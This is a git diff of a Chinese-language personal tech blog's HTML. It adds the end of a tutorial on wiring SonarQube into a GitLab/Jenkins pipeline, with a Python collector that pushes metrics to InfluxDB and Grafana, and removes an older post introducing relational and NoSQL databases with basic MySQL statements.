+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sonar.projectKey=demo  (项目名字)</span><br><span class="line">sonar.projectName=demo  (项目名字) </span><br><span class="line">sonar.language=java sonar.java.binaries=/tmp </span><br><span class="line">sonar.sources=./ </span><br><span class="line">sonar.java.source=<span class="number">1.8</span></span><br><span class="line">sonar.projectVersion=<span class="number">1.0</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320145620799.png" alt="image-20200320145620799"></p>
+<h5 id="3-3-效果如下："><a href="#3-3-效果如下：" class="headerlink" title="3.3 效果如下："></a>3.3 效果如下：</h5><h6 id="3-3-1-提交代码到gitlab："><a href="#3-3-1-提交代码到gitlab：" class="headerlink" title="3.3.1 提交代码到gitlab："></a>3.3.1 提交代码到gitlab：</h6><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320145843614.png" alt="image-20200320145843614"></p>
+<h6 id="3-3-2-gitlab通过webhook自动触发jenkins执行任务"><a href="#3-3-2-gitlab通过webhook自动触发jenkins执行任务" class="headerlink" title="3.3.2 gitlab通过webhook自动触发jenkins执行任务"></a>3.3.2 gitlab通过webhook自动触发jenkins执行任务</h6><h6 id="3-3-3-jenkins获取代码，执行sonar分析代码"><a href="#3-3-3-jenkins获取代码，执行sonar分析代码" class="headerlink" title="3.3.3 jenkins获取代码，执行sonar分析代码"></a>3.3.3 jenkins获取代码，执行sonar分析代码</h6><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320145921676.png" alt="image-20200320145921676"></p>
+<h6 id="3-3-4-在sonar的服务器界面查看分析结果"><a href="#3-3-4-在sonar的服务器界面查看分析结果" class="headerlink" title="3.3.4 在sonar的服务器界面查看分析结果"></a>3.3.4 在sonar的服务器界面查看分析结果</h6><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320145955343.png" alt="image-20200320145955343"></p>
+<h4 id="4-Sonarqube与Grafana联动"><a href="#4-Sonarqube与Grafana联动" class="headerlink" title="4. Sonarqube与Grafana联动:"></a>4. Sonarqube与Grafana联动:</h4><p>首先需要安装influnxdb与Grafana安装环境省略官网均有。</p>
+<p>然后写一个Sonarqube数据采集器，具体代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> influxdb <span class="keyword">import</span> InfluxDBClient</span><br><span class="line"></span><br><span class="line">BASE_URL = os.getenv(<span class="string">'SONAR_BASE_URL'</span>, <span class="string">'http://sonarqube.cn'</span>)</span><br><span class="line">USER = os.environ[<span class="string">'SONAR_USER'</span>]</span><br><span class="line">PASSWORD = os.getenv(<span class="string">'SONAR_PASSWORD'</span>, <span class="string">''</span>)</span><br><span class="line">INFLUX_URL = os.getenv(<span class="string">'INFLUX_URL'</span>, <span class="string">'10.100.2.20'</span>)</span><br><span class="line">INFLUX_USER = os.environ[<span class="string">'INFLUX_USER'</span>]</span><br><span class="line">INFLUX_PASSWORD = os.environ[<span class="string">'INFLUX_PASSWORD'</span>]</span><br><span class="line">INFLUX_DB = os.environ[<span class="string">'INFLUX_DB'</span>]</span><br><span class="line">INTERVAL = os.environ[<span class="string">'INTERVAL'</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SonarApiClient</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, user, passwd)</span>:</span></span><br><span class="line">        self.user = user</span><br><span class="line">        self.passwd = passwd</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_make_request</span><span class="params">(self, endpoint)</span>:</span></span><br><span class="line">        r = requests.get(BASE_URL + endpoint, auth=(self.user, self.passwd))</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_all_ids</span><span class="params">(self, endpoint)</span>:</span></span><br><span class="line">        data = self._make_request(endpoint)</span><br><span class="line">        ids = []</span><br><span class="line">        <span class="keyword">for</span> component <span class="keyword">in</span> data[<span class="string">'components'</span>]:</span><br><span class="line">            dict = &#123;</span><br><span class="line">                <span class="string">'id'</span>: component[<span class="string">'id'</span>],</span><br><span class="line">                <span class="string">'key'</span>: component[<span class="string">'key'</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            ids.append(dict)</span><br><span class="line">        <span class="keyword">return</span> ids</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_all_available_metrics</span><span class="params">(self, endpoint)</span>:</span></span><br><span class="line">        data = self._make_request(endpoint)</span><br><span class="line">        metrics = []</span><br><span class="line"><span class="comment">#        metrics1 = [vulnerabilities]</span></span><br><span class="line">        <span class="keyword">for</span> metric <span class="keyword">in</span> data[<span class="string">'metrics'</span>]:</span><br><span class="line">            <span class="keyword">if</span> metric[<span class="string">'type'</span>] <span class="keyword">in</span> [<span class="string">'INT'</span>,<span class="string">'MILLISEC'</span>,<span class="string">'WORK_DUR'</span>,<span class="string">'FLOAT'</span>,<span class="string">'PERCENT'</span>,<span class="string">'RATING'</span>]:</span><br><span class="line">                metrics.append(metric[<span class="string">'key'</span>])</span><br><span class="line"><span class="comment">#               metrics = metrics + metrics1</span></span><br><span class="line">				</span><br><span class="line">        <span class="keyword">return</span> metrics</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_measures_by_component_id</span><span class="params">(self, endpoint)</span>:</span></span><br><span class="line">        data = self._make_request(endpoint)</span><br><span class="line">        <span class="keyword">return</span> data[<span class="string">'component'</span>][<span class="string">'measures'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Project</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, identifier, key)</span>:</span></span><br><span class="line">        self.id = identifier</span><br><span class="line">        self.key = key</span><br><span class="line">        self.metrics = <span class="literal">None</span></span><br><span class="line">        self.timestamp = datetime.datetime.utcnow().isoformat()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_metrics</span><span class="params">(self, metrics)</span>:</span></span><br><span class="line">        self.metrics = metrics</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">export_metrics</span><span class="params">(self)</span>:</span></span><br><span class="line">        influx_client = InfluxDBClient(</span><br><span class="line">            host=INFLUX_URL,</span><br><span class="line">            port=<span class="number">30019</span>,</span><br><span class="line">            username=INFLUX_USER,</span><br><span class="line">            password=INFLUX_PASSWORD,</span><br><span class="line">            database=INFLUX_DB</span><br><span class="line">        )</span><br><span class="line">        influx_client.write_points(self._prepare_metrics())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_prepare_metrics</span><span class="params">(self)</span>:</span></span><br><span class="line">        json_to_export = []</span><br><span class="line">        <span class="keyword">for</span> metric <span class="keyword">in</span> self.metrics:</span><br><span class="line">            one_metric = &#123;</span><br><span class="line">                <span class="string">"measurement"</span>: metric[<span class="string">'metric'</span>],</span><br><span class="line">                <span class="string">"tags"</span>: &#123;</span><br><span class="line">                    <span class="string">"id"</span>: self.id,</span><br><span class="line">                    <span class="string">"key"</span>: self.key</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"time"</span>: self.timestamp,</span><br><span class="line">                <span class="string">"fields"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: float(metric[<span class="string">'value'</span>] <span class="keyword">if</span> (<span class="string">'value'</span> <span class="keyword">in</span> metric) <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            json_to_export.append(one_metric)</span><br><span class="line">        <span class="keyword">return</span> json_to_export</span><br><span class="line"></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"before while loop..."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"count -----"</span>)</span><br><span class="line">    <span class="keyword">print</span> (count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"begin export data..."</span>)</span><br><span class="line"></span><br><span class="line">    client = SonarApiClient(USER, PASSWORD)</span><br><span class="line">    ids = client.get_all_ids(<span class="string">'/api/components/search?qualifiers=TRK'</span>)</span><br><span class="line">    </span><br><span class="line">    metrics = client.get_all_available_metrics(<span class="string">'/api/metrics/search'</span>)</span><br><span class="line">    comma_separated_metrics = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> metric <span class="keyword">in</span> metrics:</span><br><span class="line">        comma_separated_metrics += metric + <span class="string">','</span></span><br><span class="line">    </span><br><span class="line">    uri = <span class="string">'/api/measures/component'</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> ids:</span><br><span class="line">        project_id = item[<span class="string">'id'</span>]</span><br><span class="line">        project_key = item[<span class="string">'key'</span>]</span><br><span class="line">        print(project_key, project_id)</span><br><span class="line">        project = Project(identifier=project_id, key=project_key)</span><br><span class="line">        component_id_query_param = <span class="string">'componentId='</span> + project_id</span><br><span class="line">        metric_key_query_param = <span class="string">'metricKeys='</span> + comma_separated_metrics</span><br><span class="line">        measures = client.get_measures_by_component_id(uri + <span class="string">'?'</span> + component_id_query_param + <span class="string">'&amp;'</span> + metric_key_query_param + <span class="string">'vulnerabilities'</span>)</span><br><span class="line">        project.set_metrics(measures)</span><br><span class="line">        project.export_metrics()</span><br><span class="line"></span><br><span class="line">    time.sleep(int(INTERVAL))</span><br></pre></td></tr></table></figure>
+
+<p>因为我是在dokcer中部署Garafana以及sonarqube等相关程序的，所以建议将首先将sonar_san_docker相关内容制作成镜像。命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#build a image for collector</span></span><br><span class="line"><span class="built_in">cd</span> sonar_san_docker</span><br><span class="line">docker build -t <span class="built_in">export</span>-sonarqube:v0.1 .</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">--name <span class="built_in">export</span>-sonarqube \</span><br><span class="line">-e SONAR_USER=admin \</span><br><span class="line">-e SONAR_PASSWORD=password \</span><br><span class="line">-e INFLUX_USER=root \</span><br><span class="line">-e INFLUX_PASSWORD=password \</span><br><span class="line">-e INFLUX_DB=sonarqube_data \</span><br><span class="line">-e INTERVAL=43200  \</span><br><span class="line"><span class="built_in">export</span>-sonarqube:v0.1</span><br></pre></td></tr></table></figure>
+
+<p>至此influnxdb数据库便采集到了数据：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200323144050053.png" alt="image-20200323144050053"></p>
+<p>然后数据也会传到Grafana中：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200323144159835.png" alt="image-20200323144159835"></p>
+<h5 id="代码下载链接见："><a href="#代码下载链接见：" class="headerlink" title="代码下载链接见："></a>代码下载链接见：</h5><p><a href="https://github.com/Darren-zl/sonarqube-san" target="_blank" rel="noopener">https://github.com/Darren-zl/sonarqube-san</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+
+
+    
+
+    
+
+    
+
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/23/Discuz_x3.4论坛搭建/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3252,1135 +3696,6 @@ window.onmouseout = function () {
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/19/数据库学习-2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Darren-zl">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Darren-学无止境">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/19/数据库学习-2/" itemprop="url">数据库学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-19T16:55:34+08:00">
-                2019-08-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-              <span class="post-meta-divider">|</span>
-              <span class="post-meta-item-icon">
-                <i class="fa fa-comment-o"></i>
-              </span>
-              
-                <a href="/2019/08/19/数据库学习-2/#SOHUCS" itemprop="discussionUrl">
-                  <span id="url::http://yoursite.com/2019/08/19/数据库学习-2/" class="cy_cmt_count" data-xid="2019/08/19/数据库学习-2/" itemprop="commentsCount"></span>
-                </a>
-              
-            
-          
-
-          
-          
-             <span id="/2019/08/19/数据库学习-2/" class="leancloud_visitors" data-flag-title="数据库学习">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">Visitors&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </span></div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-
-      
-      
-
-      
-        
-          
-            <h1 id="数据库学习"><a href="#数据库学习" class="headerlink" title="数据库学习"></a>数据库学习</h1><h2 id="1-什么是关系型数据库什么是非关系型数据库。"><a href="#1-什么是关系型数据库什么是非关系型数据库。" class="headerlink" title="1.什么是关系型数据库什么是非关系型数据库。"></a>1.什么是关系型数据库什么是非关系型数据库。</h2><h3 id="关系型数据库："><a href="#关系型数据库：" class="headerlink" title="关系型数据库："></a>关系型数据库：</h3><h5 id="关系型数据库：指采用关系模型来组织数据的数据库。"><a href="#关系型数据库：指采用关系模型来组织数据的数据库。" class="headerlink" title="关系型数据库：指采用关系模型来组织数据的数据库。"></a>关系型数据库：指采用关系模型来组织数据的数据库。</h5><h5 id="关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组织的一个数据组织。"><a href="#关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组织的一个数据组织。" class="headerlink" title="关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组织的一个数据组织。"></a>关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组织的一个数据组织。</h5><p>主流代表：Oracle、Microsoft SQL Server、MySQL、PostgreSQL、DB2、Microsoft Access、SQLite、Teradata、MariaDB、SAP</p>
-<p>关系型数据库概念：</p>
-<p>关系：一张二维表，每个关系都有关系名（表名）</p>
-<p>元祖：二维表中的一行，在数据库中被称为记录</p>
-<p>属性：二维表中的一列，在数据库中被称为字段</p>
-<p>域：属性的取值范围，也就是数据库中某一列的取值限制</p>
-<p>关键字：一组可以唯一标识元祖的属性，数据库中常称为主键，由一个或多个列组成</p>
-<p>关系模式：指对关系的描述。在数据库中未表结构</p>
-<h3 id="非关系型数据库："><a href="#非关系型数据库：" class="headerlink" title="非关系型数据库："></a>非关系型数据库：</h3><h5 id="非关系型数据库：指非关系型的，分布式的，且一般不保证遵循ACID原则的数据存储系统。"><a href="#非关系型数据库：指非关系型的，分布式的，且一般不保证遵循ACID原则的数据存储系统。" class="headerlink" title="非关系型数据库：指非关系型的，分布式的，且一般不保证遵循ACID原则的数据存储系统。"></a>非关系型数据库：指非关系型的，分布式的，且一般不保证遵循ACID原则的数据存储系统。</h5><h5 id="非关系型数据库结构：非关系型数据库以键值存储，且结构不固定，每一个元祖可以有不一样的字段，每个元祖可以根据需要增加一些自己的键值对，不局限与固定的结构，可以减少一些时间和空间的开销。"><a href="#非关系型数据库结构：非关系型数据库以键值存储，且结构不固定，每一个元祖可以有不一样的字段，每个元祖可以根据需要增加一些自己的键值对，不局限与固定的结构，可以减少一些时间和空间的开销。" class="headerlink" title="非关系型数据库结构：非关系型数据库以键值存储，且结构不固定，每一个元祖可以有不一样的字段，每个元祖可以根据需要增加一些自己的键值对，不局限与固定的结构，可以减少一些时间和空间的开销。"></a>非关系型数据库结构：非关系型数据库以键值存储，且结构不固定，每一个元祖可以有不一样的字段，每个元祖可以根据需要增加一些自己的键值对，不局限与固定的结构，可以减少一些时间和空间的开销。</h5><h4 id="非关系型数据库的分类"><a href="#非关系型数据库的分类" class="headerlink" title="非关系型数据库的分类"></a>非关系型数据库的分类</h4><h4 id="面向高性能并发读写的key-value数据库："><a href="#面向高性能并发读写的key-value数据库：" class="headerlink" title="面向高性能并发读写的key-value数据库："></a>面向高性能并发读写的key-value数据库：</h4><h5 id="key-value数据库的主要特点是具有极高的并发读写性能"><a href="#key-value数据库的主要特点是具有极高的并发读写性能" class="headerlink" title="key-value数据库的主要特点是具有极高的并发读写性能"></a><strong>key-value数据库的主要特点是具有极高的并发读写性能</strong></h5><p>key-value数据库是一种以键值未存储数据的一种数据库，类似java中的map。可以将整个数据库理解为一个大的map，每个键都对应一个唯一的值。</p>
-<p>主流代表为Redis， Amazon DynamoDB， Memcached，Microsoft Azure Cosmos DB和Hazelcast</p>
-<h4 id="面向海量数据访问的面向文档数据库："><a href="#面向海量数据访问的面向文档数据库：" class="headerlink" title="面向海量数据访问的面向文档数据库："></a>面向海量数据访问的面向文档数据库：</h4><p><strong>这类数据库的主要特点是在海量的数据中可以快速的查询数据</strong></p>
-<p>文档存储通常使用内部表示法，可以直接在应用程序中处理，主要是JSON。JSON文档也可以作为纯文本存储在键值中存储或关系数据库系统中。</p>
-<p>主流代表为MongoDB，Amazon DynamoDB，Couchbase，Microsoft Azure Cosmos DB和CouchDB</p>
-<h4 id="面向搜索数据内容的搜索引擎"><a href="#面向搜索数据内容的搜索引擎" class="headerlink" title="面向搜索数据内容的搜索引擎:"></a>面向搜索数据内容的搜索引擎:</h4><h5 id="搜索引擎是专门用于搜索数据内容的NoSQL数据库管理系统。"><a href="#搜索引擎是专门用于搜索数据内容的NoSQL数据库管理系统。" class="headerlink" title="搜索引擎是专门用于搜索数据内容的NoSQL数据库管理系统。"></a>搜索引擎是专门用于搜索数据内容的NoSQL数据库管理系统。</h5><p>主要是用于对海量数据进行近实时的处理和分析处理，可用于机器学习和数据挖掘。</p>
-<p>主流代表为Elasticsearch，Splunk，Solr，MarkLogic和Sphinx</p>
-<h4 id="面向可扩展性的分布式数据库："><a href="#面向可扩展性的分布式数据库：" class="headerlink" title="面向可扩展性的分布式数据库："></a>面向可扩展性的分布式数据库：</h4><h5 id="这类数据库的主要特点是具有很强的扩展性"><a href="#这类数据库的主要特点是具有很强的扩展性" class="headerlink" title="这类数据库的主要特点是具有很强的扩展性"></a>这类数据库的主要特点是具有很强的扩展性</h5><p>普通的关系型数据库都是以行为单位来存储数据库，擅长以行为单位的读入处理，比如特定条件数据的获取。因此，关系型数据库也被称为面向行的数据库。相反，面向列的数据库是以列为单位来存储数据的，擅长以列未单位读入数据。</p>
-<p>这类数据库想解决的问题就是传统数据库存在可扩展性上的缺陷，这类数据库可以适应数据量的增加以及数据结构的变化，将数据存储在记录中，能够容纳大量动态列。由于列名和记录键不是固定的，并且由于记录可能有数十亿列，因此可扩展性存储可以看作是二维键值存储。</p>
-<p>主流代表为Cassandra，HBase，Microsoft Azure Cosmos DB，Datastax Enterprise和Accumulo</p>
-<table>
-<thead>
-<tr>
-<th align="left">数据库类型</th>
-<th>特性</th>
-<th>优点</th>
-<th>缺点</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">关系型数据库（Oracle、Microsoft SQL Server、MySQL、PostgreSQL、DB2、Microsoft Access、SQLite、Teradata、MariaDB、SAP）</td>
-<td>1.关系型数据库通过外键关联来建立表与表之间的关系； <br> 2、关系型数据库的最大特点就是事务的一致性；<br>3、关系型数据库用了关系模型（指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组成的一个数据组织。）来组织数据的数据库；<br>4、简单来说，关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组成的一个数据组织。</td>
-<td>1.容易理解：二维表结构是非常贴近逻辑世界的一个概念，关系模型相对网状、层次等其他模型来说更容易理解<br>2.使用方便：通用的SQL语言使得操作关系型数据库非常方便<br>3.易于维护：丰富的完整性(实体完整性、参照完整性和用户定义的完整性)大大减低了数据冗余和数据不一致的概率</td>
-<td>1.网站的用户并发性非常高，往往达到每秒上万次读写请求，对于传统关系型数据库来说，硬盘I/O是一个很大的瓶颈<br>2.网站每天产生的数据量是巨大的，对于关系型数据库来说，在一张包含海量数据的表中查询，效率是非常低的<br>3.在基于web的结构当中，数据库是最难进行横向扩展的，当一个应用系统的用户量和访问量与日俱增的时候，数据库却没有办法像web server和app server那样简单的通过添加更多的硬件和服务节点来扩展性能和负载能力。当需要对数据库系统进行升级和扩展时，往往需要停机维护和数据迁移。<br>4.性能欠佳：在关系型数据库中，导致性能欠佳的最主要原因是多表的关联查询，以及复杂的数据分析类型的复杂SQL报表查询。为了保证数据库的ACID特性，必须尽量按照其要求的范式进行设计，关系型数据库中的表都是存储一个格式化的数据结构。<br></td>
-</tr>
-<tr>
-<td align="left">非关系型数据库（Redis、Amazon DynamoDB、Memcached、MongoDB、Solr、CouchDB、Splunk）</td>
-<td>1、使用键值对存储数据；<br>2、一般不支持ACID特性；<br>3、非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合。</td>
-<td>1.用户可以根据需要去添加自己需要的字段，为了获取用户的不同信息，不像关系型数据库中，要对多表进行关联查询。仅需要根据id取出相应的value就可以完成查询。<br>2.适用于SNS(Social Networking Services)中，例如facebook，微博。系统的升级，功能的增加，往往意味着数据结构巨大变动，这一点关系型数据库难以应付，需要新的结构化数据存储。由于不可能用一种数据结构化存储应付所有的新的需求，因此，非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合。</td>
-<td>只适合存储一些较为简单的数据，对于需要进行较复杂查询的数据，关系型数据库显的更为合适。不适合持久存储海量数据</td>
-</tr>
-</tbody></table>
-<h2 id="2-mysql数据库学习"><a href="#2-mysql数据库学习" class="headerlink" title="2.mysql数据库学习"></a>2.mysql数据库学习</h2><h3 id="数据库的简单练习"><a href="#数据库的简单练习" class="headerlink" title="数据库的简单练习"></a>数据库的简单练习</h3><h4 id="2-1-创建数据库"><a href="#2-1-创建数据库" class="headerlink" title="2.1 创建数据库"></a>2.1 创建数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database yuangong;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564992892902.png" alt="1564992892902"></p>
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564992968110.png" alt="1564992968110"></p>
-<h4 id="2-3-创建表"><a href="#2-3-创建表" class="headerlink" title="2.3 创建表"></a>2.3 创建表</h4><h5 id="2-3-1-创建员工表"><a href="#2-3-1-创建员工表" class="headerlink" title="2.3.1 创建员工表"></a>2.3.1 创建员工表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create table workers(</span><br><span class="line">			id INT,</span><br><span class="line">			name VARCHAR(20),</span><br><span class="line">			gender VARCHAR(2),</span><br><span class="line">			birthday DATE,</span><br><span class="line">			email VARCHAR(10),</span><br><span class="line">			remark VARCHAR(50)</span><br><span class="line">			);</span><br></pre></td></tr></table></figure>
-
-<p>创建成功：</p>
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564993972060.png" alt="1564993972060"></p>
-<h5 id="2-3-2-进行表的修改"><a href="#2-3-2-进行表的修改" class="headerlink" title="2.3.2 进行表的修改"></a>2.3.2 进行表的修改</h5><p>增加年龄列，将email列长度变为30，删除remark列，将name修改为username;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE workers ADD COLUMN age INT;[增加年龄列]</span><br><span class="line">ALTER TABLE workers MODIFY COLUMN email VARCHAR(30)；[修改email长度为30]</span><br><span class="line">ALTER TABLE workers DROP COLUMN remark;[删除remark列]</span><br><span class="line">ALTER TABLE workers CHANGE COLUMN name username VARCHAR(20);[修改name为username]</span><br></pre></td></tr></table></figure>
-
-<p>操作成功：</p>
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564994969014.png" alt="1564994969014"></p>
